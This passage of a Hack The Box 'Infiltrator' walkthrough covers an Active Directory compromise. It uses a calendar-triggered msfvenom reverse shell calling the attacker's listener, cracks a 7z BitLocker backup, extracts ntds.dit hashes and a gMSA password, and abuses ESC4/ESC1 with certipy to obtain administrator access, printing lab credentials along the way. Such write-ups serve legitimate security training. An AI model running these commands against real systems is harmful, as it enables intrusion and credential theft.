GET /api/chatrooms/logs?roomkey=20240220014618@conference.com&fromdate=2024/01/01&todate=2025/01/01 HTTP/1.1
Host: localhost:14125
sec-ch-ua: "Chromium";v="135", "Not-A.Brand";v="8"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
API-KEY: 558R501T5I6024Y8JV3B7KOUN1A518GG
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

Which gives us a lot of unformatted output. If we search inside of the response for martinez, we do find the line:

```
\u003eO.martinez : m@rtinez@1996!\u003c/div
```

We now have the password for martinez, at least for the messenger app. If you run an ldap check with nxc for this password on martinez, you find that it is no longer valid. But you are able to login to the messenger application.

One thing to note that makes this interesting, is that we have already seen O.martinez as active on the messenger application. We should keep this in our memory.

Something interesting we quickly find is that their calendar has some triggers setup to open the infiltrator.htb websote:

<figure><img src=".gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

If you remember from the messages earlier as well, o.martinez was complaining about pop-ups every day at 9am. We can now see the culprit. Apparently a little practical joke by a.walker.

<figure><img src=".gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

Combining all these clues, it's clear we have some control over executing some kind of processes on o.martinez's computer (dc01). We should certainly explore this. Real quick, you should notice that they mention 9am every morning, but the time of the alerts are off. This should prompt you to consider syncing the local time of your windows machine with the dc01. If you do not ensure that the times are matched up for the calendar triggers, they will not work. If you don't want to change the time, then just calculate the offset manually, based on the time of the dc01 (run the date command in the reverse shell). Note: The time of the alerts will still not match up with 9am. This is normal.

By adding an event to the calendar and exploring the options, we can see a very dangerous event type pop out:

<figure><img src=".gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

This sounds perfect. We can upload a payload to the dc01, and then trigger it with an application event. It will need to be placed in a location mutually reachable by both users, and writable by the one we own. After some testing, you will find that winrm\_svc is a good choice for this. You can also use evil-winrm to gain access to dc01 without a kerberos ticket by using this user, which is easier.

We generate a quick and dirty payload with msfvenom:

```
┌──(kali㉿kali)-[~/infiltrator-writeup]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f exe > get_me.exe 
Warning: KRB5CCNAME environment variable not supported - unsetting
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
```

We then make a directory C:\memes on dc01, and upload our payload to it:

```
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> mkdir C:\memes


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        5/14/2025  12:08 PM                memes


*Evil-WinRM* PS C:\Users\winrm_svc\Documents> upload get_me.exe
                                        
Info: Uploading /home/kali/infiltrator-writeup/get_me.exe to C:\Users\winrm_svc\Documents\get_me.exe
                                        
Data: 9556 bytes of 9556 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> mv get_me.exe C:\memes
```

On our own windows host, we then create that relative path and object, so that we can setup the trigger (the calendar will only let you make an application trigger for something that exists locally to it):

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\kali> mkdir C:\memes


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         5/14/2025  12:09 PM                memes


PS C:\Users\kali> echo 'doesnt matter' > C:\memes\get_me.exe
PS C:\Users\kali>
```

Since we just care about the trigger, our local side does not actually need to be anything meaningful (or even valid). In fact, it's more practical to NOT place the same payload here, otherwise you will be competing with the real one on dc01.

Of course, also start your listener:

```
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 4444            
listening on [any] 4444 ...
```

We now have everything in place. We can create a trigger for a couple minutes in the future, which will be synced with the correct time, and will trigger the correct path/binary on the dc01 to get us a callback.

I want to mention something. Once you saw that this might be the path, there is something you should check. Clearly, there is potentially some kind of script to trigger the payload (fake user interaction). If you query ldap for o.martinez account information, you find that every 2 minutes, their logoncount increments up by one (aka, on even minute timestamps). To be graceful, we should just place 1 trigger on an even numbered minute, to correlate with this.

{% code overflow="wrap" %}
```
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> Get-ADUser -Identity o.martinez -Properties logoncount,date

DistinguishedName : CN=O.martinez,CN=Users,DC=infiltrator,DC=htb
Enabled           : True
GivenName         :
LastLogonDate     : 5/10/2025 7:44:18 AM
logoncount        : 281

Surname           :
UserPrincipalName : O.martinez@infiltrator.htb
DateTime    : Saturday, May 10, 2025 8:30:14 AM

DistinguishedName : CN=O.martinez,CN=Users,DC=infiltrator,DC=htb
Enabled           : True
GivenName         :
LastLogonDate     : 5/10/2025 7:44:18 AM
logoncount        : 282
DateTime    : Saturday, May 10, 2025 8:30:17 AM

Surname           :
UserPrincipalName : O.martinez@infiltrator.htb

DistinguishedName : CN=O.martinez,CN=Users,DC=infiltrator,DC=htb
Enabled           : True
GivenName         :
LastLogonDate     : 5/10/2025 7:44:18 AM
logoncount        : 283
Surname           :
UserPrincipalName : O.martinez@infiltrator.htb
DateTime    : Saturday, May 10, 2025 8:32:17 AM
```
{% endcode %}

<figure><img src=".gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

After you create the event, you may want to right click on the empty calendar and select "sync calendar", to make sure it gets pushed upstream. It may also be worth nothing, that I found some permission oddities when moving the binary over to the C:\memes folder (as in, o.martinez did not have execution permissions). However, when uploading directly to that folder (specifically with winrm), those permission issues went away.

With all these, we catch a shell for o.martinez:

```
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.14.55] from (UNKNOWN) [10.129.171.160] 50099
Microsoft Windows [Version 10.0.17763.6189]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
infiltrator\o.martinez
```

My immediate interest was inside his home folder, as this is the new level of access we have, since quick permission checks showed nothing interesting. If nothing was yielded from home folder enumeration, then it would make sense to start digging deeper into other avenues.

The immediate suspect for home folder enumeration, besides obvious folders like Desktop or Documents, is the Output Messenger appdata folder. We already know that there can be useful items inside of there. Sure enough after some basic enumeration, we find ourselves a pcapng file:

```
PS C:\users\o.martinez\appdata\roaming\output messenger\faaa\Received Files\203301> ls
ls


    Directory: C:\users\o.martinez\appdata\roaming\output messenger\faaa\Received Files\203301


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        2/23/2024   4:10 PM         292244 network_capture_2024.pcapng                                           


PS C:\users\o.martinez\appdata\roaming\output messenger\faaa\Received Files\203301> 
```

Let's move that file over to our kali and check it out in wireshark.

<figure><img src=".gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

This is a pretty small pcap file, with only 237 captured frames. It should be easy enough to manually enumerate through all of it, to be sure we don't miss anything.

The immediate thing of interest is the HTTP streams. You can follow them by right clicking on one, and selecting to follow the stream. You can then increment through that stream in the bottom right.

Eventually, you will come upon this:\\

<figure><img src=".gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

This gives us a new password, "M@rtinez\_P@ssw0rd!". Checking this password with ldap does in fact confirm that this is the current dc01 password for o.martinez. Let's keep looking through this pcap file though, as I believe I saw reference to an interesting zip file.

<figure><img src=".gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

Based on the url path, /view/raw/Bitlocker-backup.7z, we can assume this is a packet containing the raw data for a zip file with a bitlocker backup key. Let's grab that.

You can go to the top left in wireshark, file > export objects > http

<figure><img src=".gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

You can then choose to save all objects to the folder:

<figure><img src=".gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

We now have all the files! Pretty sweet.

<figure><img src=".gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

All of this is actually just junk, except the "BitLocker-backup(1).7z" file. This is what we want, but it's encrypted, so we will have to crack it. We can use 7z2john to convert it to a good format first, and then crack it with hashcat. Before running it with hashcat, just snip out the first name portion "BitLocker-backup(1).7z:". Hashcat doesn't like that part. The hash should look something like:

```
$7z$2$19$0$$16$3e870837c603792850e2d8069e7747c0$........................
```

```
┌──(kali㉿kali)-[~/infiltrator-writeup/pcap_files]
└─$ 7z2john ./BitLocker-backup\(1\).7z > zip.hash
ATTENTION: the hashes might contain sensitive encrypted data. Be careful when sharing or posting these hashes
                                                                                                                                                                                                              
┌──(kali㉿kali)-[~/infiltrator-writeup/pcap_files]
└─$ hashcat ./zip.hash /usr/share/wordlists/rockyou.txt
```

This one is actually pretty intensive, unlike the previous hash. It may be a good idea to run it on your host machine.

After a few minutes, it cracks, and we see the password is "zipper". We can now simply open the files and punch in that password.

```
385cd62d929b542553fd9a74fac26fddb8ec64fc2539a$792371$10:zipper
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 11600 (7-Zip)
Hash.Target......: $7z$2$19$0$$16$3e870837c603792850e2d8069e7747c0$336...371$10
Time.Started.....: Wed May 14 15:46:42 2025 (2 mins, 13 secs)
Time.Estimated...: Wed May 14 15:48:55 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       43 H/s (5.26ms) @ Accel:32 Loops:1024 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 5632/14344385 (0.04%)
Rejected.........: 0/5632 (0.00%)
Restore.Point....: 5504/14344385 (0.04%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:523264-524288
Candidate.Engine.: Device Generator
Candidates.#1....: cadillac -> katana
Hardware.Mon.#1..: Util: 90%

Started: Wed May 14 15:46:16 2025
Stopped: Wed May 14 15:48:56 2025
```

The singualr file inside is an HTML file, which shows a webpage containing the Recovery key:

<figure><img src=".gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

```
Recovery Key: 650540-413611-429792-307362-466070-397617-148445-087043
```

With a little critical thinking, we can assume that the dc01 has a bitlocker drive which can be unlocked with this. Without getting too deep into the specifics, there are two different sets of gui calls for unlocking bitlocker drives, one is user level, and the other is administrator level. The user level one requires gui interaction (or special tooling that I didn't find). Fortunately, we have the credentials for o.martinez, and (heads up), he can rdp.

Using the credentials we gained from him, we can rdp into dc01 with the following command:

```
┌──(kali㉿kali)-[~]
└─$ xfreerdp3 /v:10.129.171.160 /u:o.martinez /p:'M@rtinez_P@ssw0rd!' /dynamic-resolution
```

After landing on the machine, we can indeed see that the E: drive is encrypted:

<figure><img src=".gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

The recovery key successfully decrypts it, and we find a "Backup\_Credentials.7z" file located in the drive, under the Administrators documents folder (these are backups, so no permission issues presented themselves).

<figure><img src=".gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

We can now move this file over to our kali for inspection.

Inside the zip, we find 3 files, SECURITY, SYSTEM, and ntds.dit:

<figure><img src=".gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

This should imediately be super interesting. These 3 files can potentially contain a huge trove of useful information. I will go ahead and spoil some information: you will not get what you need by just using impacket-secretsdump.

By doing a bit of googling about ntds.dit though, you come upon this article: [https://www.netwrix.com/ntds\_dit\_security\_active\_directory.html](https://www.netwrix.com/ntds_dit_security_active_directory.html)

Following the details of the article, and making some modifications based on our situation, we will need to install DSInternals on our windows attack host: [https://github.com/MichaelGrafnetter/DSInternals](https://github.com/MichaelGrafnetter/DSInternals)

We will also need to move the ntds.dit and system files over to our windows attack machine.

We can then run a couple of DSInternals commands:

```
PS C:\users\kali\downloads> $Key = Get-BootKey -SystemHiveFilePath .\SYSTEM                                             
PS C:\users\kali\downloads> Get-ADDBAccount -BootKey $Key -DatabasePath .\ntds.dit -All
```

And we get a HUGE amount of output. You will need to spend some time going through it all, and almost all of it is garbage, until you come upon this portion:

{% code overflow="wrap" %}
```
SamAccountType: User                                                                                                                                                                                            UserAccountControl: NormalAccount                                                                                                                                                                               Description: l@n_M@an!1331                                                                                                                                                                                      Notes:                                                                                                                                                                                                          PrimaryGroupId: 513
```
{% endcode %}

It looks like we gained the password for the lan\_managment account, which has been hinted at a couple times through the lab. We can confirm this password works with nxc and ldap:

```
┌──(kali㉿kali)-[~]
└─$ nxc ldap dc01.infiltrator.htb -u lan_managment -p 'l@n_M@an!1331'      
SMB         10.129.171.160  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
LDAP        10.129.171.160  389    DC01             [+] infiltrator.htb\lan_managment:l@n_M@an!1331
```

managmnt is spelled incorrectly. If your ldap is returning false, make sure you drop an "e".

With our new account, one of the first things you should check is the outbound permissions in bloodhound, especially since we don't remember seeing a home folder for the user on the dc01 machine:

<figure><img src=".gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

They do indeed have permission to read the group managed service account password. This is great news, so we effectively have control over infiltrator\_svc$ now. However, if you check their outbound permissions, you get nothing. They also don't seem to have a lot of control over any particular service (mssql, mysql, smb, winrm/http, etc).

There is a significant logical leap here, but remember that we saw some CA shenanigans playing out in our initial scans. Having hit a wall, we should check that out.

First, lets grab that password we need:

using gMSADumper (reccomended by bloodhound): [https://github.com/micahvandeusen/gMSADumper/blob/main/gMSADumper.py](https://github.com/micahvandeusen/gMSADumper/blob/main/gMSADumper.py)

```
┌──(kali㉿kali)-[~/infiltrator-writeup]
└─$ python3 ./gMSADumper.py -u lan_managment -p 'l@n_M@an!1331' -d infiltrator.htb
Users or groups who can read password for infiltrator_svc$:
 > lan_managment
infiltrator_svc$:::663675deae5af90402f1d53c8117cdaa
infiltrator_svc$:aes256-cts-hmac-sha1-96:6ecc3726b898126831d1335949dbc6a350dd7da5dafb0148c9ba97b78aba5274
infiltrator_svc$:aes128-cts-hmac-sha1-96:a04dd1abcb07fa5977f6306937b3c60f
```

Great, now lets take the hash and throw it into certipy: [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

We can use certipy to find dangerous certificate permissions. When I first tried to use it with the aes hash, it was failing with a kerberos error. So I used the following command to fetch a ticket first:

```
┌──(kali㉿kali)-[~/infiltrator-writeup]
└─$ impacket-getTGT infiltrator.htb/infiltrator_svc\$ -aesKey 6ecc3726b898126831d1335949dbc6a350dd7da5dafb0148c9ba97b78aba5274 -dc-ip 10.129.171.160
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in infiltrator_svc$.ccache
┌──(kali㉿kali)-[~/infiltrator-writeup]
└─$ export KRB5CCNAME=infiltrator_svc$.ccache
```

And then:

{% code overflow="wrap" %}
```
┌──(kali㉿kali)-[~/infiltrator-writeup]
└─$ certipy find -u 'infiltrator_svc$' -aes 6ecc3726b898126831d1335949dbc6a350dd7da5dafb0148c9ba97b78aba5274 -target dc01.infiltrator.htb -debug -dc-ip 10.129.171.160
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Trying to resolve 'dc01.infiltrator.htb' at '10.129.171.160'
[+] Authenticating to LDAP server
..........snip.........
[*] Saved text output to '20250514193931_Certipy.txt'
[*] Saved JSON output to '20250514193931_Certipy.json'
```
{% endcode %}

We can now check out the saved files and look for permission issues. And we do indeed find one:

{% code overflow="wrap" %}
```
    [!] Vulnerabilities
      ESC4                              : 'INFILTRATOR.HTB\\infiltrator_svc' has dangerous permissions
```
{% endcode %}

After some googling, we find that we can exploit ESC4 by first manufacturing a template vulnerable to ESC1, and then exploiting it:

{% code overflow="wrap" %}
```
┌──(kali㉿kali)-[~/infiltrator-writeup]
└─$ certipy template -template Infiltrator_Template -save-old -u infiltrator_svc$ -dc-ip 10.129.171.160 -target dc01.infiltrator.htb -aes 6ecc3726b898126831d1335949dbc6a350dd7da5dafb0148c9ba97b78aba5274 -scheme ldap
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Saved old configuration for 'Infiltrator_Template' to 'Infiltrator_Template.json'
[*] Updating certificate template 'Infiltrator_Template'
[*] Successfully updated 'Infiltrator_Template'
                                                                                                                                                                                                               
┌──(kali㉿kali)-[~/infiltrator-writeup]
└─$ certipy req -template Infiltrator_Template -u infiltrator_svc$ -dc-ip 10.129.171.160 -target dc01.infiltrator.htb -aes 6ecc3726b898126831d1335949dbc6a350dd7da5dafb0148c9ba97b78aba5274 -upn administrator -ca infiltrator-DC01-CA
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error: The NETBIOS connection with the remote host timed out.
[-] Use -debug to print a stacktrace
                                                                                                                                                                                                               
┌──(kali㉿kali)-[~/infiltrator-writeup]
└─$ certipy req -template Infiltrator_Template -u infiltrator_svc$ -dc-ip 10.129.171.160 -target dc01.infiltrator.htb -aes 6ecc3726b898126831d1335949dbc6a350dd7da5dafb0148c9ba97b78aba5274 -upn administrator -ca infiltrator-DC01-CA
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```
{% endcode %}

We hit a timeout error one of the times, but I just reran it, and it went through. We now have an "administrator.pfx" file that we can authenticate to ldap with. Let's pop an ldap shell as administrator:

```
┌──(kali㉿kali)-[~/infiltrator-writeup]
└─$ certipy auth -pfx ./administrator.pfx -ldap-shell -dc-ip 10.129.171.160      
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Connecting to 'ldaps://10.129.171.160:636'
[*] Authenticated to '10.129.171.160' as: u:INFILTRATOR\Administrator
Type help for list of commands

# 

```

And we are basically done. We have an adminstrator session inside an ldap shell, so we can just add o.martinez to the administrators group, and then rdp back in to trigger a login event and access the root flag (if the logon event does not occur automatically, just sign out manually, and then rdp back in):

```
# add_user_to_group o.martinez administrators
Adding user: O.martinez to group Administrators result: OK

xfreerdp3 /v:10.129.171.160 /u:o.martinez /p:'M@rtinez_P@ssw0rd!' /dynamic-resolution
```

<figure><img src=".gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>
